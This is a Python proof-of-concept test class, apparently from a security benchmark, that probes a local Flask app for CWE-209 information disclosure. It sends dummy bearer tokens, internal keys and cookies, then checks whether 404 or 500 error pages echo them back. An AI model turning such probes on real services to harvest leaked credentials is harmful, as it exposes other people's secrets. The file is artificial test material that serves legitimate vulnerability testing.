"""PoC: Verbose error response leaks request headers (CWE-209)."""
from mosaic.oracle.exploit import ExploitTest


class VerboseErrorExploit(ExploitTest):
    """Information disclosure: error response includes request headers with secrets."""

    def __init__(self, base_url: str = "http://localhost:5205"):
        super().__init__(base_url)

    @property
    def chain_id(self) -> str:
        return "flask_verbose_error"

    def setup(self) -> None:
        pass

    def execute(self) -> tuple[bool, str]:
        secret_token = "Bearer sk-secret-api-key-12345"
        evidence = []

        # Trigger a 404 with sensitive headers
        resp = self.http_get(
            "/nonexistent-endpoint-that-triggers-404",
            headers={
                "Authorization": secret_token,
                "X-Internal-Key": "internal-secret-value",
                "Cookie": "session=abc123secret",
            },
        )
        evidence.append(f"Status: {resp.status_code}")

        body = resp.text
        leaked_auth = "sk-secret-api-key-12345" in body
        leaked_internal = "internal-secret-value" in body
        leaked_cookie = "abc123secret" in body
        leaked_headers = "Authorization" in body or "authorization" in body.lower()

        evidence.append(f"Leaked auth token: {leaked_auth}")
        evidence.append(f"Leaked internal key: {leaked_internal}")
        evidence.append(f"Leaked cookie: {leaked_cookie}")
        evidence.append(f"Headers keyword present: {leaked_headers}")

        if leaked_auth or leaked_internal or leaked_cookie:
            leaked_items = []
            if leaked_auth:
                leaked_items.append("Authorization Bearer token")
            if leaked_internal:
                leaked_items.append("X-Internal-Key")
            if leaked_cookie:
                leaked_items.append("session cookie")
            return True, (
                f"CWE-209 Information Disclosure confirmed. "
                f"Error response leaked: {', '.join(leaked_items)}. "
                f"Request headers and secrets are exposed in error JSON. "
                + " | ".join(evidence)
            )

        # Try triggering a 500 error (POST with bad content type)
        resp2 = self.http_post(
            "/process-order",
            headers={
                "Authorization": secret_token,
                "Content-Type": "application/json",
            },
            data="not valid json {{{",
        )
        evidence.append(f"500-trigger status: {resp2.status_code}")
        if "sk-secret-api-key-12345" in resp2.text:
            return True, (
                f"CWE-209 Information Disclosure confirmed via 500 error. "
                f"Error response leaked Authorization header. "
                + " | ".join(evidence)
            )

        return False, "No header leakage in error responses. " + " | ".join(evidence)
